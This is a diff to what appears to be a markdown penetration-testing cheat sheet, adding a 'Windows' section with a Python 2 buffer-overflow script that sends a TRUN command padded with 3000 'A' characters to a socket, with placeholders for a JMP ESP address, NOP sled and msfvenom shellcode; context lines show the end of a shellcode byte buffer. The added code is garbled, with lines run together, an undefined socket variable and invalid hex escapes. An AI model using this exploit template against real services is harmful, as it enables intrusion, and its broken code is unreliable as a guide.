@@ -144,6 +144,24 @@ buf += b"\x65\x1b\x39\xf9\x26\x6a\xd8\xc8\x49"
 
 print(buf)
 ```
+
+### Windows
+```SHell
+vim SecureServerBuff.py#!/usr/bin/python2.7
+import socket
+'''
+addr
+addr
+'''buf = "TRUN/.:/"buf += "A" * 3000
+#buf += "wirechars"
+#buf += "\xad\xdr\xsw\xap" JMP ESP
+#buf += "\x90" * 15
+#buf += msfvenom commands = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Creates IPv4 sockets.connect(("IP",port)) #IP and port connection
+print s.recv(1024) #Recieve response
+s.send(buf) #Sends buf to IP and port
+print s.recv(1024) #recieve response
+s.close() #close connectionrun py
+```
 ### Post Exploitation
             MISC:
                         SSH
